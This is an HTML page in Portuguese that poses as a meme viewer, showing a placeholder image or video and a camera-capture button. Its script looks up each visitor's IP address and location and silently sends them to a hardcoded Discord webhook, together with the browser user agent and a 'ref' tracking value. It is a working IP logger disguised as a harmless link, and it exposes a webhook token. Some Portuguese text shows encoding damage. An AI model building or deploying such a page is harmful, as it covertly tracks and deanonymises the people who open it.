<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>Visualizar Meme</title>
  <style>
    body { font-family:sans-serif; text-align:center; padding:20px; background:#f4f4f4; }
    #memeArea img, #memeArea video { max-width:100%; margin:20px auto; display:block; }
    .btn-capture { 
      background:#007bff; color:#fff; border:none; padding:10px 20px; 
      border-radius:5px; cursor:pointer; font-size:16px; 
    }
    #photoPreview { margin-top:20px; max-width:100%; }
  </style>
</head>
<body>
  <h2>Meme Visualizado</h2>
  <div id="memeArea">Carregando memeâ€¦</div>
  <button id="captureBtn" class="btn-capture" style="display:none;">ðŸ¤³ Tirar Foto</button>
  <div id="photoPreview"></div>
  <p id="info" style="margin-top:20px; font-size:14px;">Carregando localizaÃ§Ã£oâ€¦</p>

  <script>
    // debug
    const params = new URLSearchParams(window.location.search);
    console.log("URL params:", window.location.search, Object.fromEntries(params.entries()));
    const meme = params.get("meme");
    const ref  = params.get("ref");

    // funÃ§Ã£o de exibiÃ§Ã£o
    function showMeme(id) {
      const area = document.getElementById("memeArea");
      if (id === "meme1") {
        area.innerHTML = '<img src="https://via.placeholder.com/300x200.png?text=Meme+1" alt>';
      } else if (id === "meme2") {
        area.innerHTML = '<video controls><source src="https://www.w3schools.com/html/mov_bbb.mp4"></video>';
      } else {
        area.innerText = "Meme nÃ£o encontrado";
        return false;
      }
      return true;
    }

    // captura de foto via botÃ£o
    function capturePhoto() {
      const preview = document.getElementById("photoPreview");
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          const video = document.createElement("video");
          video.srcObject = stream;
          video.play();
          // quando o vÃ­deo estÃ¡ pronto, capturamos um frame
          video.onloadeddata = () => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext("2d").drawImage(video, 0, 0);
            const img = new Image();
            img.id = "photoPreview";
            img.src = canvas.toDataURL("image/png");
            preview.replaceWith(img);
            stream.getTracks().forEach(t => t.stop());
          };
        })
        .catch(() => preview.innerText = "PermissÃ£o de cÃ¢mera negada.");
    }

    // carregar local e enviar Discord
    fetch("https://ipapi.co/json")
      .then(r => r.json())
      .then(data => {
        document.getElementById("info").innerHTML = 
          `Meme: ${meme}<br>Ref: ${ref}<br>IP: ${data.ip}<br>Local: ${data.city}, ${data.country_name}`;
        fetch("https://discord.com/api/webhooks/1371164024217272490/oy4D3DFmXtlobnD2QYi11LU_izNCXp5NmYPMCMmiP1Q28XrvC6UCMCiiRzTfQM_iMpb3", {
          method:"POST", headers:{"Content-Type":"application/json"},
          body: JSON.stringify({ content:
            `ðŸ‘€ Meme: ${meme}\nRef: ${ref}\nIP: ${data.ip}\nLocal: ${data.city}, ${data.country_name}\nAgent: ${navigator.userAgent}` 
          })
        });
      });

    // execuÃ§Ã£o principal
    if (showMeme(meme)) {
      const btn = document.getElementById("captureBtn");
      btn.style.display = "inline-block";
      btn.onclick = capturePhoto;
    }
  </script>
</body>
</html>
